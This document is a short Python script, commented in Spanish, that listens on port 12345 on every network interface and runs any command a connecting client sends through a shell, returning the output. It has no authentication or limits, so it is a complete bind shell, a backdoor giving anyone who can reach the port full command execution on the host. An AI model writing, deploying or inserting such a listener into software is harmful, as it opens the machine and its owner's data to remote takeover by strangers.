import socket
import subprocess

# Configura el servidor
HOST = '0.0.0.0'  # Escucha en todas las interfaces de red
PORT = 12345  # Puerto para la comunicación

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)
print(f"Esperando conexiones en el puerto {PORT}...")

while True:
    # Acepta una conexión entrante
    client_socket, client_address = server_socket.accept()
    print(f"Conexión establecida con {client_address}")

    # Bucle para recibir y ejecutar comandos en tiempo real
    while True:
        command = client_socket.recv(1024).decode()
        print(command)
        if command.lower() == 'exit':
            # Cierra la conexión del cliente y sale del bucle interno
            client_socket.close()
            break

        try:
            # Ejecuta el comando y captura la salida
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            client_socket.send(output.encode())
        except Exception as e:
            error_message = str(e)
            client_socket.send(error_message.encode())

    print(f"Conexión con {client_address} cerrada.")
